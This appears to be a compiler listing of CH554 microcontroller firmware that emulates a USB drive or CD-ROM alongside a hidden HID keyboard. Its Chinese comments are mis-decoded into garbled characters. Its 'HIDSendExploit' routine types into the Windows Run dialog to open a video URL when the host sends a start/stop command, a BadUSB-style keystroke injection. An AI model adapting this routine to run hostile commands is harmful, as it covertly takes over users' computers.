 650   4                break;
 651   4              case '\'':
 652   4                SendKey(KB_NULL,KB_QUOTE);
 653   4                break;
 654   4              case '"':
 655   4                SendKey(KB_LeftShift,KB_QUOTE);
 656   4                break;
 657   4              case ',':
 658   4                SendKey(KB_NULL,KB_COMMA);
 659   4                break;
 660   4              case '<':
 661   4                SendKey(KB_LeftShift,KB_COMMA);
 662   4                break;
 663   4              case '.':
 664   4                SendKey(KB_NULL,KB_DOT);
 665   4                break;
 666   4              case '>':
 667   4                SendKey(KB_LeftShift,KB_DOT);
 668   4                break;
 669   4              case '/':
 670   4                SendKey(KB_NULL,KB_QUESTION);
 671   4                break;
 672   4              case '?':
 673   4                SendKey(KB_LeftShift,KB_QUESTION);
 674   4                break;
 675   4              case '\t':
 676   4                SendKey(KB_NULL,KB_TAB);
 677   4                break;
 678   4              case '\n':
 679   4                SendKey(KB_NULL,KB_ENTER);
 680   4                break;
 681   4            }
 682   3          }
 683   2        }
 684   1      }
 685          
 686          void HIDSendExploit()
 687          {
 688   1          mDelaymS(2000);
 689   1          SendKey(KB_LeftGUI,KB_R);
 690   1          mDelaymS(1000);
 691   1          SendString("chrome https://www.bilibili.com/video/BV1uT4y1P7CX\n",52);
 692   1          mDelaymS(1000);
 693   1      }
 694          
 695          // BLOCK ONLY  The Thirteen Cases
 696          void  BulkThirteen(unsigned char Case)
 697          {
 698   1          switch(Case)
 699   1          {
 700   2              case CASEOK:
 701   2              case CASE1:                                         /* Hn=Dn*/
 702   2              case CASE6:                                         /* Hi=Di*/
 703   2                  BcswStatus = 0;
 704   2                  break;
 705   2              case CASE12:                                        /* Ho=Do*/
 706   2                  BcswStatus = 0;
 707   2                  break;
 708   2              case CASE2:                                         /* Hn<Di*/
 709   2              case CASE3:                                         /* Hn<Do*/
 710   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
 711   2                  FSTALL = 1;
 712   2                  // ’‚¿Ô…œ¥´∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ // may or may-not
 713   2                  BcswStatus = 2;
 714   2                  break;
 715   2              case CASE4:                                         /* Hi>Dn*/
 716   2              case CASE5:                                         /* Hi>Di*/
 717   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
 718   2                  FSTALL = 1;
 719   2                  // ’‚¿Ô…œ¥´∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ
 720   2                  BcswStatus = 1;                                 // CSW_GOOD or CSW_FAIL
 721   2                  break;
 722   2              case CASE7:                                         /* Hi<Di*/
 723   2              case CASE8:                                         /* Hi<>Do */
 724   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
 725   2                  FSTALL = 1;
 726   2                  // ’‚¿Ô…œ¥´∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ
 727   2                  BcswStatus = 2;
 728   2                  break;
 729   2              case CASE9:                                         /* Ho>Dn*/
 730   2              case CASE11:                                        /* Ho>Do*/
 731   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_R_RES ;
 732   2                  FSTALL = 1;
 733   2                  // ’‚¿Ô…œ¥´∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ
 734   2                  BcswStatus = 1;                                 // CSW_GOOD or CSW_FAIL
 735   2                  break;
 736   2              case CASE10:                                        /* Ho<>Di */
 737   2              case CASE13:                                        /* Ho<Do*/
 738   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
 739   2                  FSTALL = 1;
 740   2                  // ’‚¿Ô…œ¥´∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ
 741   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_R_RES ;
 742   2                  // ’‚¿Ô…œ¥´∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ
 743   2                  BcswStatus = 2;
 744   2                  break;
 745   2              case CASECBW:                                       /* invalid CBW */
 746   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
 747   2                  FSTALL = 1;
 748   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_R_RES ;
 749   2                  // ’‚¿Ô∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ
 750   2                  BcswStatus = 2;
 751   2                  break;
 752   2              case CASECMDFAIL:
 753   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
 754   2                  FSTALL = 1;
 755   2                  // ’‚¿Ô…œ¥´∂Àµ„…Ë÷√“ª∏ˆSTALL£¨¥˝÷˜ª˙«ÂµÙ
 756   2                  BcswStatus = 1;
 757   2                  break;
 758   2              default:
 759   2                  break;
 760   2          }
 761   1      }
 762          
 763          // ≤È—ØU≈Ã»›¡ø
 764          void  UFI_readCapacity(void)
 765          {
 766   1          pBuf = DBCAPACITY;
 767   1          if(LEN.mDataLength > sizeof(DBCAPACITY))
 768   1              LEN.mDataLength = sizeof(DBCAPACITY);
 769   1          BcswStatus  = 0;
 770   1          mSenseKey   = 0;
 771   1          mASC        = 0;
 772   1      }
 773          
 774          // ≤È—ØU≈Ã–≈œ¢
 775          void  UFI_inquiry(void)
 776          {
 777   1          if (Key_ModeSelect == 0) //»Áπ˚ƒ£ Ω—°‘Ò∞¥≈•±ª∞¥œ¬£¨‘ÚŒ™U≈Ãƒ£ Ω
 778   1          {  
 779   2              pBuf = DBINQUITY_USB_Drive;
 780   2              if(LEN.mDataLength > sizeof(DBINQUITY_USB_Drive))
 781   2                  LEN.mDataLength = sizeof(DBINQUITY_USB_Drive);
 782   2              BcswStatus  = 0;
 783   2              mSenseKey   = 0;
 784   2              mASC        = 0;
 785   2          }
 786   1          else //ƒ¨»œŒ™CD-ROMƒ£ Ω
 787   1          {
 788   2              pBuf = DBINQUITY_CD_ROM;
 789   2              if(LEN.mDataLength > sizeof(DBINQUITY_CD_ROM))
 790   2                  LEN.mDataLength = sizeof(DBINQUITY_CD_ROM);
 791   2              BcswStatus  = 0;
 792   2              mSenseKey   = 0;
 793   2              mASC        = 0;
 794   2          } 
 795   1      }
 796          
 797          // ∂¡»° ˝æ›
 798          void  UFI_read10(void)
 799          {
 800   1          LEN.mDataLength = (((UINT32)MassPara.cbw.cbwcb.buf1[7] << 8) | (UINT32)MassPara.cbw.cbwcb.buf1[8]) * DISK_SEC_LEN;
 801   1          Locate_Addr = ((UINT32)MassPara.cbw.cbwcb.buf1[2] << 24) | ((UINT32)MassPara.cbw.cbwcb.buf1[3] << 16) | ((UINT32)M
             -assPara.cbw.cbwcb.buf1[4] << 8) | (UINT32)MassPara.cbw.cbwcb.buf1[5];
 802   1          Locate_Addr = Locate_Addr * DISK_SEC_LEN;
 803   1          BcswStatus = 0;
 804   1          mSenseKey = 0;
 805   1          mASC = 0;
 806   1          pBuf_ReSelect = 1;
 807   1      }
 808          
 809          // ƒ£ Ω»œ ∂
 810          void  UFI_modeSense(void)
 811          {
 812   1          if(MassPara.cbw.cbwcb.buf1[2] == 0x3F)
 813   1          {
 814   2              if(LEN.mDataLength > sizeof(modesense3F)) LEN.mDataLength = sizeof(modesense3F);
 815   2              pBuf = modesense3F;
 816   2              BcswStatus = 0;
 817   2              mSenseKey = 0;
 818   2              mASC = 0;
 819   2          }
 820   1          else
 821   1          {
 822   2              CH375BULKUP = 0;
 823   2              mSenseKey = 5;
 824   2              mASC = 0x20;
 825   2              BcswStatus = 1;
 826   2              BulkThirteen(CASECMDFAIL);
 827   2          }
 828   1      }
 829          
 830          // «Î«Û»œ ∂
 831          void  UFI_requestSense(void)
 832          {
 833   1          if(FSTALL | lastFSTALL)
 834   1          {
 835   2              lastFSTALL = FSTALL;
 836   2              FSTALL = 0;
 837   2              MassPara.Sense.ErrorCode = 0x70;
 838   2              MassPara.Sense.Reserved1 = 0;
 839   2              MassPara.Sense.SenseKey = mSenseKey;
 840   2              MassPara.Sense.Information[0] = 0;
 841   2              MassPara.Sense.Information[1] = 0;
 842   2              MassPara.Sense.Information[2] = 0;
 843   2              MassPara.Sense.Information[3] = 0;
 844   2              MassPara.Sense.AddSenseLength = 0x0a;
 845   2              MassPara.Sense.Reserved2[0] = 0;
 846   2              MassPara.Sense.Reserved2[1] = 0;
 847   2              MassPara.Sense.Reserved2[2] = 0;
 848   2              MassPara.Sense.Reserved2[3] = 0;
 849   2              MassPara.Sense.AddSenseCode = mASC;
 850   2              MassPara.Sense.AddSenseCodeQua = 00;
 851   2              MassPara.Sense.Reserved3[0] = 0;
 852   2              MassPara.Sense.Reserved3[1] = 0;
 853   2              MassPara.Sense.Reserved3[2] = 0;
 854   2              MassPara.Sense.Reserved3[3] = 0;
 855   2              pBuf = MassPara.buf;
 856   2              BcswStatus = 0;
 857   2          }
 858   1          else
 859   1          {
 860   2              lastFSTALL = FSTALL;
 861   2              FSTALL = 0;
 862   2              MassPara.Sense.ErrorCode = 0x70;
 863   2              MassPara.Sense.Reserved1 = 0;
 864   2              MassPara.Sense.SenseKey = 0x00;
 865   2              MassPara.Sense.Information[0] = 0;
 866   2              MassPara.Sense.Information[1] = 0;
 867   2              MassPara.Sense.Information[2] = 0;
 868   2              MassPara.Sense.Information[3] = 0;
 869   2              MassPara.Sense.AddSenseLength = 0x0a;
 870   2              MassPara.Sense.Reserved2[0] = 0;
 871   2              MassPara.Sense.Reserved2[1] = 0;
 872   2              MassPara.Sense.Reserved2[2] = 0;
 873   2              MassPara.Sense.Reserved2[3] = 0;
 874   2              MassPara.Sense.AddSenseCode = 0x00;
 875   2              MassPara.Sense.AddSenseCodeQua = 00;
 876   2              MassPara.Sense.Reserved3[0] = 0;
 877   2              MassPara.Sense.Reserved3[1] = 0;
 878   2              MassPara.Sense.Reserved3[2] = 0;
 879   2              MassPara.Sense.Reserved3[3] = 0;
 880   2              pBuf = MassPara.buf;
 881   2              BcswStatus = 0;
 882   2          }
 883   1      }
 884          
 885          // ≤‚ ‘U≈Ã «∑Ò◊º±∏∫√
 886          void  UFI_testUnit(void)
 887          {
 888   1          CH375BULKDOWN = 0;
 889   1          CH375BULKUP = 0;
 890   1          BcswStatus = 0;
 891   1          mSenseKey = 0;
 892   1          mASC = 0;
 893   1      }
 894          
 895          // ‘ –Ì“∆≥ˆ¥≈≈Ã
 896          void  UFI_perOrMed(void)
 897          {
 898   1          BcswStatus = 0;
 899   1          mSenseKey = 0;
 900   1          mASC = 0;
 901   1      }
 902          
 903          // –¥»Î ˝æ›
 904          void  UFI_write(void)
 905          {
 906   1          UINT8 i, num;
 907   1      
 908   1          LEN.mDataLength = (((UINT32)MassPara.cbw.cbwcb.buf1[7] << 8) | (UINT32)MassPara.cbw.cbwcb.buf1[8]) * DISK_SEC_LEN;
             -      // –¥ ˝æ›≥§∂»
 909   1          Locate_Addr = ((UINT32)MassPara.cbw.cbwcb.buf1[2] << 24) | ((UINT32)MassPara.cbw.cbwcb.buf1[3] << 16) | ((UINT32)M
             -assPara.cbw.cbwcb.buf1[4] << 8) | (UINT32)MassPara.cbw.cbwcb.buf1[5];
 910   1          Locate_Addr = Locate_Addr * DISK_SEC_LEN;       // –¥ ˝æ›µÿ÷∑
 911   1          if (Locate_Addr<(UINT32)(5000000UL))
 912   1          {
 913   2            num = MassPara.cbw.cbwcb.buf1[8];               // ¥˝–¥…»«¯ ˝
 914   2            for(i = 0; i < num; i++)
 915   2                EraseFlash(Locate_Addr + i * DISK_SEC_LEN); // ≤¡≥˝…»«¯
 916   2          }
 917   1          BcswStatus = 0;
 918   1          mSenseKey = 0;
 919   1          mASC = 0;
 920   1      }
 921          
 922          // «Î«Û◊∞‘ÿ–∂‘ÿ…Ë±∏
 923          void  UFI_staStoUnit(void)
 924          {
 925   1          CH375BULKDOWN = 0;
 926   1          CH375BULKUP = 0;
 927   1          BcswStatus = 0;
 928   1          mSenseKey = 0;
 929   1          mASC = 0;
 930   1      }
 931          
 932          // –£—È¥Ê¥¢∆˜ø’º‰
 933          void  UFI_verify(void)
 934          {
 935   1          BcswStatus = 0;
 936   1          mSenseKey = 0;
 937   1          mASC = 0;
 938   1          // ’‚¿Ô’‚¿Ô÷ª «◊˜Œ™—› æÀ˘“‘√ª”–’Ê’˝ºÏ≤‚ŒÔ¿Ì¥Ê¥¢∆˜
 939   1          // µ´ µº …œ’‚“ª≤Ω“ª∂®“™¥¶¿Ì
 940   1      }
 941          
 942          void  UFI_modeSense5(void)
 943          {
 944   1          if(MassPara.cbw.cbwcb.buf1[2] == 0x3F)
 945   1          {
 946   2              if(LEN.mDataLength > sizeof(mode5sense3F))
 947   2                  LEN.mDataLength = sizeof(mode5sense3F);
 948   2              pBuf = mode5sense3F;
 949   2              BcswStatus = 0;
 950   2              mSenseKey = 0;
 951   2              mASC = 0;
 952   2          }
 953   1          else
 954   1          {
 955   2              CH375BULKUP = 0;
 956   2              mSenseKey = 5;
 957   2              mASC = 0x20;
 958   2              BcswStatus = 1;
 959   2              BulkThirteen(CASECMDFAIL);
 960   2          }
 961   1      }
 962          
 963          void  UFI_readTOC(void)
 964          {
 965   1          UINT8C  TOC[] = {
 966   1            0x00,0x12,0x01,0x01,0x00,0x14,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
 967   1            0x14,0xAA,0x00,0x00,0x00,0x0c,0x6c
 968   1          };
 969   1          pBuf = TOC;
 970   1          if(LEN.mDataLength > sizeof(TOC))
 971   1              LEN.mDataLength = sizeof(TOC);
 972   1          BcswStatus  = 0;
 973   1          mSenseKey   = 0;
 974   1          mASC        = 0;
 975   1      }
 976          
 977          void  UFI_GET_EVE_STA_NOT(void)
 978          {
 979   1          UINT8C  TOC[] = {
 980   1                  0x06,
 981   1                  0x01,
 982   1                  0x00,
 983   1                  0x5E,
 984   1                  0x00,
 985   1                  0x00,
 986   1                  0x00,
 987   1                  0x00
 988   1                  };
 989   1          pBuf = TOC;
 990   1          if(LEN.mDataLength > sizeof(TOC))
 991   1              LEN.mDataLength = sizeof(TOC);
 992   1          BcswStatus  = 0;
 993   1          mSenseKey   = 0;
 994   1          mASC        = 0;
 995   1      }
 996          
 997          // UFI CMD
 998          void UFI_Hunding(void)
 999          {
1000   1          switch(MassPara.cbw.cbwcb.buf1[0])
1001   1          {
1002   2              case INQUIRY:
1003   2                  UFI_inquiry();
1004   2                  break;
1005   2              case WRITE:
1006   2                  UFI_write();
1007   2                  break;
1008   2              case TES_UNIT:
1009   2                  UFI_testUnit();
1010   2                  break;
1011   2              case READ:
1012   2                  UFI_read10();
1013   2                  break;
1014   2              case REQUEST_SENSE:
1015   2                  UFI_requestSense();
1016   2                  break;
1017   2              case READ_CAPACITY:
1018   2                  UFI_readCapacity();
1019   2                  break;
1020   2              case VERIFY:
1021   2                  UFI_verify();
1022   2                  break;
1023   2              case FORMATCAP:
1024   2      //            pBuf = DBFORMATCAP;
1025   2      //            if(LEN.mDataLength > sizeof(DBFORMATCAP)) 
1026   2      //                LEN.mDataLength = sizeof(DBFORMATCAP);    
1027   2                  BcswStatus=0;
1028   2                  mSenseKey=0;
1029   2                  mASC=0;     
1030   2                  break;
1031   2      //      case MODE_SELECT:
1032   2      //          UFI_modeSlect();
1033   2      //          break;
1034   2              case MODE_SENSE:
1035   2                  UFI_modeSense();
1036   2                  break;
1037   2              case MODE_SENSE5:
1038   2                  UFI_modeSense5();
1039   2                  break;
1040   2      //      case WRITE_BUFFER:
1041   2      //          UFI_writeBuf();
1042   2      //          break;
1043   2      //      case PREVENT:
1044   2      //          break;
1045   2      //      case FORMAT_UNIT:
1046   2      //          UFI_format();
1047   2      //          break;
1048   2      //      case RELEASE:
1049   2      //          break;
1050   2              case STA_STO_UNIT:
1051   2                  UFI_staStoUnit();
1052   2                  IsHIDSendExploit=1;
1053   2                  break;
1054   2              case PRE_OR_MED:
1055   2                  UFI_perOrMed();
1056   2                  break;
1057   2              case READTOC:
1058   2                  UFI_readTOC();
1059   2                  break;
1060   2              case GET_EVE_STA_NOT:
1061   2                  UFI_GET_EVE_STA_NOT();
1062   2                  break;
1063   2              default:
1064   2                  mSenseKey = 5;
1065   2                  mASC = 0x20;
1066   2                  BcswStatus = 1;
1067   2                  CH375BULKUP = 0;
1068   2                  BulkThirteen(CASECBW);
1069   2                  break;
1070   2          }
1071   1      }
1072          
1073          void mCH375BulkOnly()
1074          {
1075   1          if(MassPara.buf[0] == 0x55)
1076   1          {
1077   2              if(MassPara.buf[1] == 0x53)
1078   2              {
1079   3                  if(MassPara.buf[2] == 0x42)
1080   3                  {
1081   4                      if(MassPara.buf[3] == 0x43)
1082   4                      {
1083   5      //                  LEN.mDataLength = BIG_ENDIAN(MassPara.cbw.dCBWDatL);            // ◊ˆBO–≠“È¥¶¿Ì
1084   5                          LEN.mdataLen[3] = *(unsigned char *)(&MassPara.cbw.dCBWDatL);   /* Ω´PCª˙µƒµÕ◊÷Ω⁄‘⁄«∞µƒ16Œª◊÷ ˝æ›◊
             -™ªªŒ™C51µƒ∏ﬂ◊÷Ω⁄‘⁄«∞µƒ ˝æ› */
1085   5                          LEN.mdataLen[2] = *((unsigned char *)(&MassPara.cbw.dCBWDatL) + 1);
1086   5                          LEN.mdataLen[1] = *((unsigned char *)(&MassPara.cbw.dCBWDatL) + 2);
1087   5                          LEN.mdataLen[0] = *((unsigned char *)(&MassPara.cbw.dCBWDatL) + 3);
1088   5                          mdCBWTag[0] = MassPara.buf[4];
1089   5                          mdCBWTag[1] = MassPara.buf[5];
1090   5                          mdCBWTag[2] = MassPara.buf[6];
1091   5                          mdCBWTag[3] = MassPara.buf[7];             
1092   5                                            // »°≥ˆ ˝æ›≥§∂»
1093   5                          if(LEN.mDataLength)
1094   5                          {
1095   6                              CH375BULKDOWN   = (MassPara.cbw.bmCBWFlags & 0x80) ? 0 : 1; // œ¬¥´ ˝æ›(OUT)
1096   6                              CH375BULKUP     = (MassPara.cbw.bmCBWFlags & 0x80) ? 1 : 0; // …œ¥´ ˝æ›(IN)
1097   6                          }
1098   5                          CH375CSW = 1;
1099   5                          UFI_Hunding();  // µ˜”√UFI–≠“È¥¶¿Ì
1100   5                      }
1101   4                      else
1102   4                          UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
1103   4                  }
1104   3                  else
1105   3                      UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
1106   3              }
1107   2              else
1108   2                  UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
1109   2          }
1110   1          else
1111   1              UEP1_CTRL = UEP1_CTRL | MASK_UEP_T_RES ;
1112   1      }
1113          
1114          // …œ¥´CSW
1115          void mCH375UpCsw()
1116          {
1117   1          unsigned char i;
1118   1          
1119   1          pBuf = &MassPara.buf[0];
1120   1          CH375CSW = 0;
1121   1          CH375BULKUP = 0;            // »°œ˚ ˝æ›…œ¥´
1122   1          MassPara.buf[0] = 0x55;     // dCSWSignature
1123   1          MassPara.buf[1] = 0x53;
1124   1          MassPara.buf[2] = 0x42;
1125   1          MassPara.buf[3] = 0x53;
1126   1          MassPara.buf[4] = mdCBWTag[0];
1127   1          MassPara.buf[5] = mdCBWTag[1];
1128   1          MassPara.buf[6] = mdCBWTag[2];
1129   1          MassPara.buf[7] = mdCBWTag[3];
1130   1          MassPara.buf[8] = 0;
1131   1          MassPara.buf[9] = 0;
1132   1          MassPara.buf[10] = LEN.mdataLen[1];
1133   1          MassPara.buf[11] = LEN.mdataLen[0];
1134   1          MassPara.buf[12] = BcswStatus;
1135   1          for(i = 0; i < 13; i++)
1136   1          {
1137   2              Ep1Buffer[MAX_PACKET_SIZE + i] = *pBuf;
1138   2              pBuf++;
1139   2          }
1140   1          UEP1_T_LEN = 13;
1141   1          UEP1_CTRL = UEP1_CTRL & ~ MASK_UEP_T_RES | UEP_T_RES_ACK;  // ‘ –Ì…œ¥´
1142   1      }
1143          
1144          // ∂Àµ„1…œ¥´ ˝æ›(IN)
1145          void mCH375bulkUpData()
1146          {
1147   1          unsigned char len, i;
1148   1          
1149   1          if(LEN.mDataLength > 0x40)
1150   1          {
1151   2              len = 0x40;
1152   2              LEN.mDataLength -= 0x40;
1153   2          }
1154   1          else
1155   1          {
1156   2              len = (unsigned char) LEN.mDataLength;
1157   2              LEN.mDataLength = 0;
1158   2              CH375BULKUP = 0;
1159   2          }
1160   1          if(pBuf_ReSelect)
1161   1          {
1162   2              BulkReadFlash(Locate_Addr, len, &Ep1Buffer[MAX_PACKET_SIZE]);
1163   2              Locate_Addr += len;
1164   2              if(LEN.mDataLength == 0)
1165   2                  pBuf_ReSelect = 0;
1166   2          }
1167   1          else
1168   1          {
1169   2              for(i = 0; i < len; i++)
1170   2              {
1171   3                  Ep1Buffer[MAX_PACKET_SIZE + i] = *pBuf;
1172   3                  pBuf++;
1173   3              }
1174   2          }
1175   1          UEP1_T_LEN = len;
1176   1          UEP1_CTRL = UEP1_CTRL & ~ MASK_UEP_T_RES | UEP_T_RES_ACK;  // ‘ –Ì…œ¥´
1177   1      }
1178          
1179          UINT8I buffer[64];
1180          // ∂Àµ„1œ¬¥´ ˝æ›(OUT)
1181          void mCH375BulkDownData()
1182          {
1183   1          unsigned char len, i;
1184   1      
1185   1          len = USB_RX_LEN;
1186   1          for(i = 0; i != len; i++)
1187   1              buffer[i] = Ep1Buffer[i];   // Ω´ ˝æ›∂¡»ÎµΩª∫≥Â«¯
1188   1          BulkWriteFlash(Locate_Addr, len, &buffer[0]);
1189   1          Locate_Addr += len;
1190   1          LEN.mDataLength -= len;         // »´æ÷ ˝æ›≥§∂»ºıµÙµ±«∞ªÒµ√µƒ≥§∂»
1191   1          if(LEN.mDataLength == 0)        // »Áπ˚ ˝æ›Œ™0, ‘Ú¥´ÀÕCSW
1192   1          {
1193   2              CH375BULKDOWN = 0;          // œ¬¥´ÕÍ≥…
1194   2              mCH375UpCsw();              // …œ¥´CSW
1195   2          }
1196   1      }
1197          
1198          /*******************************************************************************
1199          * Function Name  : USB_DeviceInterrupt()
1200          * Description    : CH554 USBƒ£ƒ‚…Ë÷√÷–∂œ¥¶¿Ì∫Ø ˝
1201          *******************************************************************************/
1202          void    USB_DeviceInterrupt(void) interrupt INT_NO_USB using 1                  // USB÷–∂œ∑˛ŒÒ≥Ã–Ú,  π”√ºƒ¥Ê∆˜◊È1
1203          {
1204   1          UINT8   len, i;
1205   1          static  UINT8   SetupReqCode, SetupLen;
1206   1          static  PUINT8  pDescr;
1207   1      
1208   1          if(UIF_TRANSFER)                                                            // USB¥´ ‰ÕÍ≥…
1209   1          {
1210   2              switch(USB_INT_ST & (MASK_UIS_TOKEN | MASK_UIS_ENDP))                   // ∑÷Œˆ≤Ÿ◊˜¡Ó≈∆∫Õ∂Àµ„∫≈
1211   2              {
1212   3                  case UIS_TOKEN_IN | 1:                                              // endpoint 1# ∂Àµ„…œ¥´
1213   3                  {
1214   4                      if(CH375BULKUP) mCH375bulkUpData();                             // µ˜”√ ˝æ›…œ¥´
1215   4                      else if(CH375CSW) mCH375UpCsw();                                // …œ¥´CSW
1216   4                      else
1217   4                          UEP1_CTRL = UEP1_CTRL & ~ MASK_UEP_T_RES | UEP_T_RES_NAK;   // ‘›Õ£…œ¥´
1218   4                      break;
1219   4                  }
1220   3                  case UIS_TOKEN_OUT | 1:                                             // endpoint 1# ∂Àµ„œ¬¥´
1221   3                  {
1222   4                      if(U_TOG_OK)                                                    // ≤ªÕ¨≤Ωµƒ ˝æ›∞¸Ω´∂™∆˙
1223   4                      {
1224   5                          if(CH375BULKDOWN)  mCH375BulkDownData();                    // »Áπ˚…œ¥´ ˝æ›Ω◊∂Œ‘Úµ˜”√ ˝æ›…œ¥´
1225   5                          else                                                        // ≤ª « ˝æ›œ¬¥´‘Ú≈–∂œ «∑Ò
1226   5                          {
1227   6                              len = USB_RX_LEN;
1228   6                              if(!len)break;                                          //  ˝æ›∞¸≥§∂»Œ™¡„‘ÚÃ¯≥ˆ
1229   6                              for(i = 0; i != len; i++)
1230   6                                  MassPara.buf[i] = Ep1Buffer[i];                     // Ω´ ˝æ›∂¡»ÎµΩª∫≥Â«¯
1231   6                              mCH375BulkOnly();
1232   6                              if(!CH375BULKDOWN)
1233   6                              {
1234   7                                  if(CH375BULKUP) mCH375bulkUpData();                 // µ˜”√≈˙¡ø ˝æ›…œ¥´
1235   7                                  else if(!FSTALL) mCH375UpCsw();                     // √ª”– ˝æ›…œ¥´µ˜”√CSW…œ¥´
1236   7                                  // ‘⁄’‚¿Ô◊ˆ…œ¥´ ˝æ›µ˜”√
1237   7                              }
1238   6                          }
1239   5                      }
1240   4                      break;
1241   4                  }
1242   3                  case UIS_TOKEN_IN | 2:                                              // endpoint 2# ∂Àµ„…œ¥´
1243   3                  {
1244   4                      UEP2_T_LEN = 0;
1245   4                      UEP2_CTRL = UEP2_CTRL & ~ MASK_UEP_T_RES | UEP_T_RES_NAK;   
1246   4                      IsHIDDataSent = 1;   
1247   4                      break;
1248   4                  }
1249   3                  case UIS_TOKEN_SETUP | 0:                                           // endpoint 0# SETUP
1250   3                  {
1251   4                      len = USB_RX_LEN;
1252   4                      if(len == sizeof(USB_SETUP_REQ))                                // SETUP∞¸≥§∂»
1253   4                      {
1254   5                          SetupLen = UsbSetupBuf->wLengthL;
1255   5                          if(UsbSetupBuf->wLengthH || SetupLen > 0x7F)
1256   5                          {
1257   6                              SetupLen = 0x7F;                                        // œﬁ÷∆◊‹≥§∂»
1258   6                          }
1259   5                          len = 0;                                                    // ƒ¨»œŒ™≥…π¶≤¢«“…œ¥´0≥§∂»
1260   5                          if((UsbSetupBuf->bRequestType & USB_REQ_TYP_MASK) != USB_REQ_TYP_STANDARD)  // ¿‡«Î«Û
1261   5                          {
1262   6                              SetupReqCode = UsbSetupBuf->bRequest;
1263   6                              if(SetupReqCode == 0xFE)                                // GET MAX LUN
1264   6                              {
1265   7                                  pDescr = (PUINT8)(&MAX_LUN[0]);
1266   7                                  len = 1;
1267   7                                  if(SetupLen > len)
1268   7                                  {
1269   8                                      SetupLen = len;                                 // œﬁ÷∆◊‹≥§∂»
1270   8                                  }
1271   7                                  len = SetupLen >= THIS_ENDP0_SIZE ? THIS_ENDP0_SIZE : SetupLen;  // ±æ¥Œ¥´ ‰≥§∂»
1272   7                                  memcpy(Ep0Buffer, pDescr, len);                     // º”‘ÿ…œ¥´ ˝æ›
1273   7                                  SetupLen -= len;
1274   7                                  pDescr += len;
1275   7                                  UsbReady = 1;
1276   7                              }
1277   6                          }
1278   5                          else                                                        // ±Í◊º«Î«Û
1279   5                          {
1280   6                              SetupReqCode = UsbSetupBuf->bRequest;
1281   6                              switch(SetupReqCode)                                    // «Î«Û¬Î
1282   6                              {
1283   7                                  case USB_GET_DESCRIPTOR:
1284   7                                      switch(UsbSetupBuf->wValueH)
1285   7                                      {
1286   8                                          case USB_DESCR_TYP_DEVICE:                  // …Ë±∏√Ë ˆ∑˚
1287   8                                              pDescr = MyDevDescr;
1288   8                                              len = sizeof(MyDevDescr);
1289   8                                              break;
1290   8                                          case USB_DESCR_TYP_CONFIG:                  // ≈‰÷√√Ë ˆ∑˚
1291   8                                              pDescr = MyCfgDescr;
1292   8                                              len = sizeof(MyCfgDescr);
1293   8                                              break;
1294   8                                          case USB_DESCR_TYP_STRING:                  // ◊÷∑˚¥Æ√Ë ˆ∑˚
1295   8                                              switch(UsbSetupBuf->wValueL)
1296   8                                              {
1297   9                                                  case 0:
1298   9                                                      pDescr = MyLangDescr;
1299   9                                                      len = sizeof(MyLangDescr);
1300   9                                                      break;
1301   9                                                  case 1:
1302   9                                                      pDescr = MyManuInfo;
1303   9                                                      len = sizeof(MyManuInfo);
1304   9                                                      break;
1305   9                                                  case 2:
1306   9                                                      pDescr = MyProdInfo;
1307   9                                                      len = sizeof(MyProdInfo);
1308   9                                                      break;
1309   9                                                  default:
1310   9                                                      len = 0xFF;                     // ≤ª÷ß≥÷µƒ◊÷∑˚¥Æ√Ë ˆ∑˚
1311   9                                                      break;
1312   9                                              }
1313   8                                              break;
1314   8                                          case USB_DESCR_TYP_REPORT:
1315   8                                              switch(UsbSetupBuf->wValueL)
1316   8                                              {
1317   9                                                  case 0:
1318   9                                                      pDescr = HIDReportDescriptor;   // HID√Ë ˆ∑˚
1319   9                                                      len = sizeof(HIDReportDescriptor);
1320   9                                                      break;
1321   9                                                  default:
1322   9                                                      len = 0xFF;                     // ≤ª÷ß≥÷µƒ◊÷∑˚¥Æ√Ë ˆ∑˚
1323   9                                                      break;
1324   9                                              }
1325   8                                              break;
1326   8                                          default:
1327   8                                              len = 0xFF;                             // ≤ª÷ß≥÷µƒ√Ë ˆ∑˚¿‡–Õ
1328   8                                              break;
1329   8                                      }
1330   7                                      if(SetupLen > len)
1331   7                                      {
1332   8                                          SetupLen = len;                             // œﬁ÷∆◊‹≥§∂»
1333   8                                      }
1334   7                                      len = SetupLen >= THIS_ENDP0_SIZE ? THIS_ENDP0_SIZE : SetupLen; // ±æ¥Œ¥´ ‰≥§∂»
1335   7                                      memcpy(Ep0Buffer, pDescr, len);                 // º”‘ÿ…œ¥´ ˝æ›
1336   7                                      SetupLen -= len;
1337   7                                      pDescr += len;
1338   7                                      break;
1339   7                                  case USB_SET_ADDRESS:
1340   7                                      SetupLen = UsbSetupBuf->wValueL;                // ‘›¥ÊUSB…Ë±∏µÿ÷∑
1341   7                                      break;
1342   7                                  case USB_GET_CONFIGURATION:
1343   7                                      Ep0Buffer[0] = UsbConfig;
1344   7                                      if(SetupLen >= 1)
1345   7                                      {
1346   8                                          len = 1;
1347   8                                      }
1348   7                                      break;
1349   7                                  case USB_SET_CONFIGURATION:
1350   7                                      UsbConfig = UsbSetupBuf->wValueL;
